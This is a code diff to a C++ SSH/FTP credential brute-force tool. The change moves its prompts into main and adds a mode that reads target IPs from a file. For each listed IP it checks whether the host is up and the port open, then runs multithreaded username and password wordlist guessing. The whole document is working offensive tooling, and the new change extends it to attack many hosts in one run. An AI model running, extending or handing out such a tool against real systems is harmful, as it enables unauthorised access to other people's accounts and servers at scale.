@@ -15,7 +15,6 @@
 using namespace std;
 
 // Global Variables
-int MAX_THREAD;
 vector<std::thread> threads;
 atomic<bool> found(false);
 
@@ -29,6 +28,40 @@ atomic<bool> found(false);
 #define BLUE    "\033[1;94m"
 #define CYAN    "\033[1;96m"
 #define WHITE   "\033[1;97m"
+
+string trim(const string& value) {
+    size_t start = value.find_first_not_of(" \t\r\n");
+    if (start == string::npos) return "";
+    size_t end = value.find_last_not_of(" \t\r\n");
+    return value.substr(start, end - start + 1);
+}
+
+void waitAndClearThreads() {
+    for (auto& t : threads) {
+        if (t.joinable()) t.join();
+    }
+    threads.clear();
+}
+
+vector<string> loadTargetsFromFile(const string& filePath) {
+    vector<string> targets;
+    ifstream file(filePath);
+    string line;
+
+    if (!file) {
+        cerr << RED << "[-] Can't open ip list file: " << filePath << RESET << endl;
+        return targets;
+    }
+
+    while (getline(file, line)) {
+        string ip = trim(line);
+        if (!ip.empty()) {
+            targets.push_back(ip);
+        }
+    }
+
+    return targets;
+}
 
 bool waitForResponse(int sock, int timeoutSec) {
     fd_set readfds;
@@ -196,24 +229,16 @@ int banner() {
     return 0;
 }
 
-void bruteWithUserListOnly(string ip, int port, int service) {
-    string filename, password, username;
-    cout << YELLOW << "[?] Wordlist file path (userlist): ";
-    cin >> filename;
-
+void bruteWithUserListOnly(const string& ip, int port, int service, const string& filename, const string& password, int maxThread) {
+    found = false;
     ifstream file(filename);
+    string username;
+
     if (!file) {
-        cout << RED << "[-] Can't open file" << RESET << endl;
+        cout << RED << "[-] Can't open file: " << filename << RESET << endl;
         return;
     }
 
-    cout << YELLOW << "[?] Enter password: ";
-    cin >> password;
-
-    cout << YELLOW << "\n[?] Max Thread (5-10): ";
-    cin >> MAX_THREAD;
-
-    banner();
     cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
     cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
     cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;
@@ -228,12 +253,13 @@ void bruteWithUserListOnly(string ip, int port, int service) {
             threads.emplace_back(ftpBrute, username, password, ip, port);
         }
 
-        if (threads.size() >= MAX_THREAD) {
-            for (auto& t : threads) t.join();
-            threads.clear();
+        if (threads.size() >= static_cast<size_t>(maxThread)) {
+            waitAndClearThreads();
             if (found) break;
         }
     }
+
+    waitAndClearThreads();
 
     if (!found.load()) {
         cout << RED << "[-] No valid credential found" << RESET << endl;
@@ -243,24 +269,16 @@ void bruteWithUserListOnly(string ip, int port, int service) {
 }
 
 
-void bruteWithPassListOnly(string ip, int port, int service) {
-    string filename, password, username;
-    cout << YELLOW << "[?] Wordlist file path (passlist): ";
-    cin >> filename;
-
+void bruteWithPassListOnly(const string& ip, int port, int service, const string& filename, const string& username, int maxThread) {
+    found = false;
     ifstream file(filename);
+    string password;
+
     if (!file) {
-        cout << RED << "[-] Can't open file" << RESET << endl;
+        cout << RED << "[-] Can't open file: " << filename << RESET << endl;
         return;
     }
 
-    cout << YELLOW << "[?] Enter username: ";
-    cin >> username;
-
-    cout << YELLOW << "\n[?] Max Thread (5-10): ";
-    cin >> MAX_THREAD;
-
-    banner();
     cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
     cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
     cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;
@@ -275,12 +293,13 @@ void bruteWithPassListOnly(string ip, int port, int service) {
             threads.emplace_back(ftpBrute, username, password, ip, port);
         }
 
-        if (threads.size() >= MAX_THREAD) {
-            for (auto& t : threads) t.join();
-            threads.clear();
+        if (threads.size() >= static_cast<size_t>(maxThread)) {
+            waitAndClearThreads();
             if (found) break;
         }
     }
+
+    waitAndClearThreads();
 
     if (!found.load()) {
         cout << RED << "[-] No valid credential found" << RESET << endl;
@@ -291,13 +310,9 @@ void bruteWithPassListOnly(string ip, int port, int service) {
 
 
 
-void bruteWithUserAndPassList(string ip, int port, int service) {
-    string userfile, passfile, username, password;
-    cout << YELLOW << "[?] Wordlist file path (userlist): ";
-    cin >> userfile;
-    cout << YELLOW << "[?] Wordlist file path (passlist): ";
-    cin >> passfile;
-
+void bruteWithUserAndPassList(const string& ip, int port, int service, const string& userfile, const string& passfile, int maxThread) {
+    found = false;
+    string username, password;
     ifstream ufile(userfile);
     ifstream pfile(passfile);
 
@@ -306,10 +321,6 @@ void bruteWithUserAndPassList(string ip, int port, int service) {
         return;
     }
 
-    cout << YELLOW << "\n[?] Max Thread (5-10): ";
-    cin >> MAX_THREAD;
-
-    banner();
     cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
     cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
     cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;
@@ -330,9 +341,8 @@ void bruteWithUserAndPassList(string ip, int port, int service) {
                 threads.emplace_back(ftpBrute, username, password, ip, port);
             }
 
-            if (threads.size() >= MAX_THREAD) {
-                for (auto& t : threads) t.join();
-                threads.clear();
+            if (threads.size() >= static_cast<size_t>(maxThread)) {
+                waitAndClearThreads();
                 if (found) break;
             }
         }
@@ -340,7 +350,7 @@ void bruteWithUserAndPassList(string ip, int port, int service) {
         if (found) break;
     }
 
-    for (auto& t : threads) t.join();
+    waitAndClearThreads();
 
     if (!found.load()) {
         cout << RED << "[-] No valid credential found" << RESET << endl;
@@ -355,17 +365,33 @@ int main () {
 
     banner();
 
-    string ip;
-    int port, service;
+    vector<string> targets;
+    string ip, ipListPath;
+    int targetMode, port, service, mode, maxThread;
+    string userFile, passFile, username, password;
 
-    cout << YELLOW << "[?] Enter target IP: ";
-    cin >> ip;
+    cout << CYAN << "\n[!] Target Input Mode\n\n";
+    cout << BLUE << "[1] Single IP\n";
+    cout << BLUE << "[2] IP list file (one IP per line)\n";
+    cout << YELLOW << "\n[?] Choose target input mode (1-2): ";
+    cin >> targetMode;
 
-    if (!isHostUp(ip)) {
-        cout << RED << "[-] The host is down" << RESET << endl;
+    if (targetMode == 1) {
+        cout << YELLOW << "[?] Enter target IP: ";
+        cin >> ip;
+        targets.push_back(trim(ip));
+    } else if (targetMode == 2) {
+        cout << YELLOW << "[?] Enter ip list file path: ";
+        cin >> ipListPath;
+        targets = loadTargetsFromFile(ipListPath);
+        if (targets.empty()) {
+            cout << RED << "[-] No valid IPs found in file" << RESET << endl;
+            return 1;
+        }
+    } else {
+        cout << RED << "[-] Invalid target input mode!" << RESET << endl;
         return 1;
     }
-    cout << GREEN << "[+] The host is up" << RESET << endl;
 
     // Service selection
     cout << CYAN << "\n[!] Choose Target Service\n\n";
@@ -383,27 +409,13 @@ int main () {
     cout << CYAN << "[!] Suggested Port: ";
     switch(service) {
         case 1: cout << "22"; break;
-        case 2: cout << "20,21"; break;
+        case 2: cout << "21"; break;
     }
     cout << RESET << endl;
 
     cout << YELLOW << "[?] Enter port number: ";
     cin >> port;
 
-    // Service Name for port check message
-    string serviceName = (service == 1) ? "SSH" : "FTP";
-
-    cout << CYAN << "[!] Checking " << serviceName << " port is open or not..." << RESET << endl;
-    if (!portChecker(ip, port)) {
-        cout << RED << "[-] Port " << port << " is closed" << RESET << endl;
-        return 1;
-    } else {
-        cout << GREEN << "[+] Port " << port << " is open" << RESET << endl;
-    }
-
-    banner();
-
-    int mode;
     cout << CYAN << "\n[!] Mode selection\n\n";
     cout << BLUE << "[1] Username Brute-force\n";
     cout << BLUE << "[2] Password Brute-force\n";
@@ -416,13 +428,76 @@ int main () {
         return 1;
     }
 
-    // Function call based on mode
     if (mode == 1) {
-        bruteWithUserListOnly(ip, port, service);
+        cout << YELLOW << "[?] Wordlist file path (userlist): ";
+        cin >> userFile;
+        cout << YELLOW << "[?] Enter password: ";
+        cin >> password;
     } else if (mode == 2) {
-        bruteWithPassListOnly(ip, port, service);
-    } else if (mode == 3) {
-        bruteWithUserAndPassList(ip, port, service);
+        cout << YELLOW << "[?] Wordlist file path (passlist): ";
+        cin >> passFile;
+        cout << YELLOW << "[?] Enter username: ";
+        cin >> username;
+    } else {
+        cout << YELLOW << "[?] Wordlist file path (userlist): ";
+        cin >> userFile;
+        cout << YELLOW << "[?] Wordlist file path (passlist): ";
+        cin >> passFile;
+    }
+
+    cout << YELLOW << "\n[?] Max Thread (5-10): ";
+    cin >> maxThread;
+    if (maxThread < 1) {
+        cout << RED << "[-] Max Thread must be at least 1" << RESET << endl;
+        return 1;
+    }
+
+    if ((mode == 1 || mode == 3)) {
+        ifstream testUserFile(userFile);
+        if (!testUserFile) {
+            cout << RED << "[-] Can't open file: " << userFile << RESET << endl;
+            return 1;
+        }
+    }
+
+    if ((mode == 2 || mode == 3)) {
+        ifstream testPassFile(passFile);
+        if (!testPassFile) {
+            cout << RED << "[-] Can't open file: " << passFile << RESET << endl;
+            return 1;
+        }
+    }
+
+    string serviceName = (service == 1) ? "SSH" : "FTP";
+
+    for (size_t i = 0; i < targets.size(); ++i) {
+        const string currentIp = trim(targets[i]);
+        if (currentIp.empty()) continue;
+
+        banner();
+        cout << CYAN << "[!] Target " << (i + 1) << "/" << targets.size() << ": " << currentIp << RESET << endl;
+        cout << CYAN << "[!] Checking the host is up or down..." << RESET << endl;
+
+        if (!isHostUp(currentIp)) {
+            cout << RED << "[-] The host is down or unreachable: " << currentIp << RESET << endl;
+            continue;
+        }
+        cout << GREEN << "[+] The host is up: " << currentIp << RESET << endl;
+
+        cout << CYAN << "[!] Checking " << serviceName << " port is open or not..." << RESET << endl;
+        if (!portChecker(currentIp, port)) {
+            cout << RED << "[-] Port " << port << " is closed on " << currentIp << RESET << endl;
+            continue;
+        }
+        cout << GREEN << "[+] Port " << port << " is open on " << currentIp << RESET << endl;
+
+        if (mode == 1) {
+            bruteWithUserListOnly(currentIp, port, service, userFile, password, maxThread);
+        } else if (mode == 2) {
+            bruteWithPassListOnly(currentIp, port, service, passFile, username, maxThread);
+        } else {
+            bruteWithUserAndPassList(currentIp, port, service, userFile, passFile, maxThread);
+        }
     }
 
     return 0;
